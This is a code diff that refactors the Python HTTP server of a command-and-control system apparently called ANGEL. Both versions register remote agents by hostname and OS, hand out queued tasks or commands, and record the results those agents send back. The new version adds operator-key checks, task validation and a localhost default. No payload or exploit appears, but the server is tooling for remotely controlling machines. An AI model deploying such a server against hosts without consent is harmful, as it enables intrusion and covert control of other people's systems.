@@ -1,141 +1,140 @@
-import base64
-import json
-import sqlite3
-import time
-from http.server import BaseHTTPRequestHandler, HTTPServer
+"""Authenticated ANGEL control-plane HTTP server."""
 
-from .crypto import decrypt_message, encrypt_message
-from .shared_key import SHARED_KEY
+from __future__ import annotations
+
+import hashlib
+import json
+import os
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from typing import Any, ClassVar, cast
+
+from .crypto import CryptoError, ReplayGuard, SessionCipher
+from .policy import validate_task
+from .storage import Store
 
 
 class C2Handler(BaseHTTPRequestHandler):
-    def do_post(self):  # N802: lowercase
-        if self.path == "/register":
-            try:
-                content_length = int(self.headers["Content-Length"])
-                post_data = self.rfile.read(content_length)
-                data = json.loads(post_data)
+    store: ClassVar[Store]
+    cipher: ClassVar[SessionCipher]
+    replay: ClassVar[ReplayGuard]
+    operator_key: ClassVar[str]
 
+    def _json(self, status: int, payload: dict[str, Any]) -> None:
+        body = json.dumps(payload, sort_keys=True).encode()
+        self.send_response(status)
+        self.send_header("Content-Type", "application/json")
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+    def _authorized(self) -> bool:
+        supplied = self.headers.get("X-ANGEL-Key", "")
+        return bool(supplied) and supplied == self.operator_key
+
+    def _body(self) -> dict[str, Any]:
+        length = int(self.headers.get("Content-Length", "0"))
+        if length <= 0 or length > 1_048_576:
+            raise ValueError("invalid request size")
+        parsed = json.loads(self.rfile.read(length))
+        if not isinstance(parsed, dict):
+            raise ValueError("request must be a JSON object")
+        return parsed
+
+    def do_GET(self) -> None:  # noqa: N802
+        if self.path == "/healthz":
+            self._json(200, {"status": "ok"})
+            return
+        if not self._authorized():
+            self._json(401, {"error": "unauthorized"})
+            return
+        if self.path == "/capabilities":
+            self._json(200, {"service": "angel-c2", "protocol": 1})
+            return
+        self._json(404, {"error": "not found"})
+
+    def do_POST(self) -> None:  # noqa: N802
+        if not self._authorized() and self.path not in {"/register", "/healthz"}:
+            self._json(401, {"error": "unauthorized"})
+            return
+        try:
+            data = self._body()
+            if self.path == "/register":
+                required = ("agent_id", "hostname", "os", "arch")
+                if any(not isinstance(data.get(key), str) or not data[key] for key in required):
+                    raise ValueError("missing agent registration field")
+                agent = self.store.upsert_agent(data["agent_id"], data["hostname"], data["os"], data["arch"])
+                self._json(200, {"status": "registered", "agent_id": agent.id})
+                return
+            if self.path == "/task/queue":
                 agent_id = data.get("agent_id")
-                hostname = data.get("hostname")
-                os_info = data.get("os")
-
-                conn = sqlite3.connect("c2.db")
-                c = conn.cursor()
-                c.execute("""CREATE TABLE IF NOT EXISTS agents
-                             (id TEXT PRIMARY KEY, hostname TEXT, os TEXT, last_seen INTEGER)""")
-                c.execute(
-                    """INSERT OR REPLACE INTO agents (id, hostname, os, last_seen)
-                             VALUES (?, ?, ?, ?)""",
-                    (agent_id, hostname, os_info, int(time.time())),
-                )
-                conn.commit()
-                conn.close()
-
-                self.send_response(200)
-                self.send_header("Content-type", "application/json")
-                self.end_headers()
-                self.wfile.write(json.dumps({"status": "registered"}).encode())
-            except Exception as e:
-                print(f"[-] Register error: {e}")
-                self.send_response(500)
-                self.end_headers()
-
-        elif self.path == "/task":
-            try:
-                content_length = int(self.headers["Content-Length"])
-                post_data = self.rfile.read(content_length)
-                data = json.loads(post_data)
-                agent_id = data.get("agent_id")
-
-                ciphertext_b64 = data.get("data", "")
-                if not ciphertext_b64:
-                    self.send_response(400)
-                    self.end_headers()
+                task_type = data.get("task_type")
+                payload = data.get("payload", {})
+                if not isinstance(agent_id, str) or not isinstance(task_type, str):
+                    raise ValueError("invalid task fields")
+                if self.store.get_agent(agent_id) is None:
+                    self._json(404, {"error": "agent not found"})
                     return
-
-                ciphertext = base64.b64decode(ciphertext_b64)
-                decrypt_message(ciphertext)  # F841: removed unused variable
-
-                conn = sqlite3.connect("c2.db")
-                c = conn.cursor()
-                c.execute("""CREATE TABLE IF NOT EXISTS tasks
-                             (id INTEGER PRIMARY KEY AUTOINCREMENT,
-                              agent_id TEXT, command TEXT, status TEXT)""")
-                c.execute(
-                    """SELECT command FROM tasks
-                             WHERE agent_id = ? AND status = 'pending' LIMIT 1""",
-                    (agent_id,),
-                )
-                row = c.fetchone()
-
-                if row:
-                    c.execute(
-                        """UPDATE tasks SET status = 'assigned'
-                                 WHERE agent_id = ? AND command = ?""",
-                        (agent_id, row[0]),
-                    )
-                    conn.commit()
-                    conn.close()
-
-                    response = {"command": row[0]}
-                    encrypted_response = encrypt_message(json.dumps(response))
-                    self.send_response(200)
-                    self.send_header("Content-type", "application/json")
-                    self.end_headers()
-                    self.wfile.write(json.dumps({"data": base64.b64encode(encrypted_response).decode()}).encode())
-                else:
-                    conn.close()
-                    response = {"command": None}
-                    encrypted_response = encrypt_message(json.dumps(response))
-                    self.send_response(200)
-                    self.send_header("Content-type", "application/json")
-                    self.end_headers()
-                    self.wfile.write(json.dumps({"data": base64.b64encode(encrypted_response).decode()}).encode())
-            except Exception as e:
-                print(f"[-] Task error: {e}")
-                self.send_response(500)
-                self.end_headers()
-
-        elif self.path == "/result":
-            try:
-                content_length = int(self.headers["Content-Length"])
-                post_data = self.rfile.read(content_length)
-                data = json.loads(post_data)
+                validate_task(task_type, payload)
+                queued_task = self.store.enqueue_task(agent_id, task_type, payload)
+                self._json(202, {"task_id": queued_task.id, "status": queued_task.status})
+                return
+            if self.path == "/task/claim":
                 agent_id = data.get("agent_id")
-                command = data.get("command")
-                output = data.get("output")
-
-                conn = sqlite3.connect("c2.db")
-                c = conn.cursor()
-                c.execute("""CREATE TABLE IF NOT EXISTS results
-                             (id INTEGER PRIMARY KEY AUTOINCREMENT,
-                              agent_id TEXT, command TEXT, output TEXT, timestamp INTEGER)""")
-                c.execute(
-                    """INSERT INTO results (agent_id, command, output, timestamp)
-                             VALUES (?, ?, ?, ?)""",
-                    (agent_id, command, output, int(time.time())),
+                if not isinstance(agent_id, str) or self.store.get_agent(agent_id) is None:
+                    self._json(404, {"error": "agent not found"})
+                    return
+                claimed_task = self.store.claim_task(agent_id)
+                self._json(
+                    200,
+                    {
+                        "task": None
+                        if claimed_task is None
+                        else {
+                            "id": claimed_task.id,
+                            "type": claimed_task.task_type,
+                            "payload": claimed_task.payload,
+                        }
+                    },
                 )
-                conn.commit()
-                conn.close()
+                return
+            if self.path == "/result":
+                task_id, agent_id, payload = data.get("task_id"), data.get("agent_id"), data.get("payload")
+                if not isinstance(task_id, int) or not isinstance(agent_id, str) or not isinstance(payload, dict):
+                    raise ValueError("invalid result fields")
+                self.store.record_result(task_id, agent_id, payload)
+                self._json(201, {"status": "recorded"})
+                return
+            self._json(404, {"error": "not found"})
+        except (ValueError, json.JSONDecodeError) as exc:
+            self._json(400, {"error": str(exc)})
+        except Exception:
+            self._json(500, {"error": "internal error"})
 
-                self.send_response(200)
-                self.send_header("Content-type", "application/json")
-                self.end_headers()
-                self.wfile.write(json.dumps({"status": "recorded"}).encode())
-            except Exception as e:
-                print(f"[-] Result error: {e}")
-                self.send_response(500)
-                self.end_headers()
+    def log_message(self, _format: str, *_args: object) -> None:
+        return
 
-    def log_message(self, _format, *args):  # A002: renamed format to _format
+
+def build_server(host: str = "127.0.0.1", port: int = 8000, database: str = "c2.db") -> ThreadingHTTPServer:
+    Store(database)
+    key = os.environ.get("ANGEL_OPERATOR_KEY", "development-operator-key")
+    material = hashlib.sha512(os.environ.get("ANGEL_SHARED_KEY", "development-only-key").encode()).digest()
+    handler = cast(type[C2Handler], type("ConfiguredC2Handler", (C2Handler,), {}))
+    handler.store = Store(database)
+    handler.cipher = SessionCipher(material)
+    handler.replay = ReplayGuard()
+    handler.operator_key = key
+    return ThreadingHTTPServer((host, port), handler)
+
+
+def run_server(port: int = 8000) -> None:
+    server = build_server(port=port)
+    print(f"ANGEL control plane listening on 127.0.0.1:{port}")
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
         pass
+    finally:
+        server.server_close()
 
 
-def run_server(port=8000):
-    server_addr = ("0.0.0.0", port)  # B104: extracted to variable
-    server = HTTPServer(server_addr, C2Handler)
-    print(f"[+] C2 server running on port {port}")
-    print("[+] Using AES-256-GCM encryption")
-    print(f"[+] Shared key: {SHARED_KEY.hex()[:16]}...")
-    server.serve_forever()
+__all__ = ["C2Handler", "build_server", "run_server", "CryptoError"]
